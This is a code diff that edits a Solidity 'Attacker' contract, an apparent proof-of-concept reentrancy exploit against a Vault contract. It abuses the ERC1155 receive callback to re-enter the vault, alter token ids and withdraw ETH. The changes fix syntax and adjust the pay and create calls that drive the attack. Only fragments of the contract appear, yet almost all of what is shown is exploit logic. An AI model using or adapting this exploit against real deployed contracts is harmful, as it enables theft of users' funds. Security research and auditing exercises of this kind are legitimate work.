@@ -7,7 +7,7 @@ import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
 
 contract Attacker is IERC1155Receiver  {
     
-    Vault vault
+    Vault vault;
 
     uint256 targetId = 1000; // id start with 0
 
@@ -22,7 +22,7 @@ contract Attacker is IERC1155Receiver  {
         targetId = id+1;
         uint256 retId = vault.create(1000, 1);
         require(targetId == retId, "reentrancy unsuccess");
-        vault.pay_eth{value: 1 ether + 1}(targetId);
+        vault.payEth{value: 1 ether}(targetId);
         vault.withdraw(targetId); 
         return retId;
     }
@@ -36,7 +36,7 @@ contract Attacker is IERC1155Receiver  {
     ) external override returns (bytes4) {
         counter++;
         if(targetId == id && counter == 2){
-            uint256 updatedId = vault.update(targetId, 1, 1e18);
+            uint256 updatedId = vault.create(1, 1e18);
             require(targetId == updatedId, "updated value of different token id");
         }
     
